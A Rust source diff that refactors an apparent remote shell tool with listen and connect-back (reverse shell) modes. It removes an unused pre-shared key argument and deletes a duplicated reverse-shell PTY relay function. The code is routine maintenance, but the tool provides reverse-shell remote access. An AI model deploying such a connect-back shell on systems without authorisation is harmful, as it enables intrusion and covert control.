@@ -100,9 +100,8 @@ pub async fn run_listen_mode(port: u16, psk: &str) -> TshResult<()> {
         if let Some(accept_result) = result {
             match accept_result {
                 Ok(layer) => {
-                    let psk = psk.to_string();
                     tokio::spawn(async move {
-                        if let Err(e) = handle_client_connection(layer, &psk).await {
+                        if let Err(e) = handle_client_connection(layer).await {
                             error!("Client handler error: {e}");
                         }
                     });
@@ -148,8 +147,8 @@ pub async fn run_connect_back_mode(host: &str, port: u16, delay: u64, psk: &str)
                     continue;
                 }
 
-                // Handle shell session
-                if let Err(e) = handle_reverse_shell(&mut layer).await {
+                // Handle shell session (reuses the same PTY relay as direct mode)
+                if let Err(e) = handle_shell_mode(&mut layer).await {
                     error!("Reverse shell error: {e}");
                 }
             }
@@ -171,7 +170,7 @@ pub async fn run_connect_back_mode(host: &str, port: u16, delay: u64, psk: &str)
     }
 }
 
-pub async fn handle_client_connection(mut layer: NoiseLayer, _psk: &str) -> TshResult<()> {
+pub async fn handle_client_connection(mut layer: NoiseLayer) -> TshResult<()> {
     info!("Handling new client connection");
 
     // Show remote public key for verification
@@ -647,58 +646,4 @@ async fn send_sysinfo(layer: &mut NoiseLayer) -> TshResult<()> {
     Ok(())
 }
 
-async fn handle_reverse_shell(layer: &mut NoiseLayer) -> TshResult<()> {
-    info!("Starting reverse shell PTY session");
-
-    // Create PTY
-    let pty = Pty::new().map_err(|e| TshError::pty(format!("Failed to create PTY: {e}")))?;
-
-    // Main reverse shell loop
-    let mut pty_buf = vec![0u8; 8192];
-    loop {
-        tokio::select! {
-            // Read from PTY and send to client
-            pty_result = pty.read(&mut pty_buf) => {
-                match pty_result {
-                    Ok(n) => {
-                        if n == 0 {
-                            info!("PTY closed");
-                            break;
-                        }
-                        if let Err(e) = layer.write_all(&pty_buf[..n]).await {
-                            error!("Failed to send PTY data to client: {e}");
-                            break;
-                        }
-                    }
-                    Err(e) => {
-                        error!("PTY read error: {e}");
-                        break;
-                    }
-                }
-            }
-
-            // Read from client and send to PTY
-            client_result = read_client_data(layer) => {
-                match client_result {
-                    Ok(data) => {
-                        if data.is_empty() {
-                            info!("Client disconnected");
-                            break;
-                        }
-                        if let Err(e) = pty.write(&data).await {
-                            error!("Failed to write to PTY: {e}");
-                            break;
-                        }
-                    }
-                    Err(e) => {
-                        error!("Client read error: {e}");
-                        break;
-                    }
-                }
-            }
-        }
-    }
-
-    info!("Reverse shell session ended");
-    Ok(())
-}
+// handle_reverse_shell removed — was identical to handle_shell_mode
